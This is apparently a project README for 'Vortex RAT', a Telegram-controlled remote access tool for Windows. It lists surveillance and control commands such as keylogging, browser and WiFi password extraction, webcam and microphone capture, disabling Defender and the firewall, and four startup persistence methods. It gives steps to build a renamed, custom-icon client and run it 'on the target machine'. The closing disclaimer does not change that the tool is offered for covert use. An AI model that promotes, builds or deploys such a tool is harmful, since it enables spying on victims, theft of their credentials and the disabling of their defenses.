<div align="center">

# ⚡ Vortex RAT

### Remote Administration Tool via Telegram

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Telegram](https://img.shields.io/badge/Telegram-Bot%20API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://core.telegram.org/bots)
[![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://microsoft.com)

**Fully featured remote administration tool controlled through a Telegram bot.**
**Multi-device support · Auto-reconnect · 60+ commands · Premium Builder UI**

---

</div>

## ✨ Highlights

- 🖥️ **60+ Remote Commands** — shell execution, file management, webcam, screenshots, keylogging, and more
- 📱 **Multi-Device Support** — manage multiple machines from a single Telegram bot, each with a unique device ID
- 🔄 **Auto-Reconnect** — automatically notifies you when a machine comes back online after shutdown or restart
- 🛡️ **Startup Persistence** — 4 different persistence methods (registry, startup folder, scheduled tasks, HKLM)
- 🔨 **Premium Builder** — sleek GUI to configure and compile client executables with custom names and icons
- 🔒 **Admin-Only Access** — only your Telegram User ID can issue commands

---

## 🚀 Quick Start

### Prerequisites
- **Python 3.8+** installed on the build machine
- **PyInstaller** — `pip install pyinstaller`

### Setup

**1. Create a Telegram Bot**
- Open Telegram → search **@BotFather** → send `/newbot`
- Follow the prompts and copy the **Bot Token**

**2. Get Your User ID**
- Search **@userinfobot** on Telegram → send `/start`
- Note your numeric **User ID**

**3. Build the Client**
- Run `Vortex RAT Builder.exe`
- Paste your **Bot Token** and **User ID**
- Customize the exe name, icon, and admin mode
- Click **⚡ BUILD EXECUTABLE**
- The client `.exe` appears in the `output/` folder

**4. Deploy**
- Run the client `.exe` on the target machine
- You'll receive an automatic notification on Telegram
- Send `/help` to see all available commands

---

## 📋 Commands

### 🖥️ System
| Command | Description |
|---------|-------------|
| `/shell <cmd>` | Execute shell command |
| `/admincheck` | Check admin privileges |
| `/sysinfo` | Full system info (CPU, RAM, GPU, disk, uptime) |
| `/whoami` | Current user details |
| `/datetime` | Date and time |
| `/shutdown` | Shutdown PC |
| `/restart` | Restart PC |
| `/logoff` | Log off user |
| `/lock` | Lock workstation |
| `/sleep` | Sleep mode |
| `/listprocess` | List running processes |
| `/prockill <name>` | Kill a process |
| `/idletime` | User idle time |
| `/installed` | List installed programs |
| `/services` | List Windows services |
| `/startup` | Add to Windows startup (4 methods) |
| `/rmstartup` | Remove all persistence |
| `/devices` | List all connected devices |

### 📁 File Management
| Command | Description |
|---------|-------------|
| `/cd <path>` | Change directory |
| `/dir` | List current directory |
| `/currentdir` | Show working directory |
| `/download <file>` | Download file from PC |
| `/upload` | Upload file to PC (attach file) |
| `/uploadlink <url> <name>` | Download URL to PC |
| `/delete <path>` | Delete file or folder |
| `/copy <src> <dst>` | Copy file |
| `/move <src> <dst>` | Move file |
| `/rename <old> <new>` | Rename file |
| `/mkdir <path>` | Create folder |
| `/openfile <path>` | Open file on PC |
| `/drives` | List all drives |
| `/search <name>` | Search for files |
| `/encrypt <file> <key>` | Encrypt file (XOR) |
| `/decrypt <file> <key>` | Decrypt file (XOR) |

### 🎭 Interaction
| Command | Description |
|---------|-------------|
| `/message <text>` | Show message box |
| `/fakeerror <text>` | Show fake error dialog |
| `/voice <text>` | Text-to-speech |
| `/write <text>` | Type on keyboard |
| `/wallpaper` | Set wallpaper (attach image) |
| `/website <url>` | Open URL in browser |
| `/audio` | Play audio file (attach) |
| `/popup <n> <text>` | Spam popup messages |
| `/volumeup` | Volume +10% |
| `/volumedown` | Volume −10% |
| `/mute` | Toggle mute |
| `/monitors_off` | Turn screens off |

### 📷 Capture & Surveillance
| Command | Description |
|---------|-------------|
| `/screenshot` | Take screenshot |
| `/clipboard` | Get clipboard text |
| `/setclipboard <text>` | Set clipboard text |
| `/getcams` | List available cameras |
| `/selectcam <n>` | Select camera index |
| `/webcampic` | Take webcam picture |
| `/geolocate` | Geolocate by IP |
| `/record <sec>` | Record microphone |
| `/keylog` | Start keylogger |
| `/stopkeylog` | Stop keylogger & get log |
| `/passwords` | Extract browser passwords |

### 🌐 Network
| Command | Description |
|---------|-------------|
| `/wifilist` | Scan nearby WiFi networks |
| `/wifipasswords` | Show saved WiFi passwords |
| `/ipconfig` | Network adapter info |
| `/netstat` | Active connections |
| `/env` | Environment variables |

### 🔒 System Control
| Command | Description |
|---------|-------------|
| `/blocksite <site>` | Block website (hosts file) |
| `/unblocksite <site>` | Unblock website |
| `/disabletaskmgr` | Disable Task Manager |
| `/enabletaskmgr` | Enable Task Manager |
| `/disabledefender` | Disable Windows Defender |
| `/enabledefender` | Restore Windows Defender |
| `/disablefirewall` | Disable Windows Firewall |
| `/enablefirewall` | Restore Windows Firewall |
| `/hidetaskbar` | Hide taskbar |
| `/showtaskbar` | Show taskbar |
| `/hidedesktop` | Hide desktop icons |
| `/showdesktop` | Show desktop icons |
| `/swap_mouse` | Swap mouse buttons |
| `/unswap_mouse` | Reset mouse buttons |
| `/bluescreen` | Trigger BSOD (requires admin) |
| `/critproc` | Make process unkillable |

### ⚙️ General
| Command | Description |
|---------|-------------|
| `/start` | Connect & show device info |
| `/help` | Show all commands |
| `/exit` | Exit client |

---

## 📱 Multi-Device Management

Vortex RAT supports **multiple devices** running simultaneously from a single Telegram bot.

- **Unique Device ID** — Each machine gets a stable ID based on hostname, username, and MAC address
- **Device Tags** — Messages are tagged with `[HOSTNAME | username]` so you always know which device is which
- **`/devices` command** — All connected devices respond with their full info card
- **Auto-Notifications** — Every device notifies you automatically when it starts:
  - `🟢 Client Started` — fresh manual launch
  - `🔄 Machine Back Online` — after a shutdown or restart (with retry logic for network delays)

---

## 🔄 Persistence

The `/startup` command uses **4 different methods** to ensure the client survives reboots:

| Method | Scope | Admin Required |
|--------|-------|:--------------:|
| HKCU Registry Run key | Current user | ❌ |
| Startup Folder (VBS/BAT) | Current user | ❌ |
| Scheduled Task (on logon) | Current user | ❌ |
| HKLM Registry Run key | All users | ✅ |

Remove all persistence with `/rmstartup`.

---

## 🏗️ Project Structure

```
Vortex RAT/
├── Vortex RAT Builder.exe   # Standalone builder (run this)
├── builder.py                # Builder source code
├── client.py                 # Client source code (bundled in builder)
├── image.png                 # Donate QR code (bundled in builder)
├── favicon (4).ico           # Builder icon
├── requirements.txt          # Python dependencies
├── output/                   # Built client executables go here
└── README.md
```

---

## 📦 Dependencies

```
pyTelegramBotAPI    Pillow       pyttsx3      pyautogui
opencv-python       pyperclip    requests     pystray
pyinstaller         psutil       pycaw        comtypes
pyaudio             keyboard     pycryptodome
```

Install all: `pip install -r requirements.txt`

---

## ⚠️ Disclaimer

> **This tool is intended for authorized remote administration and educational purposes only.**
> Unauthorized use of this software on systems you do not own or have explicit permission to access is **illegal** and punishable by law. The developers assume no liability for misuse.

---

<div align="center">

**Made with ❤️ by Vortex**

</div>
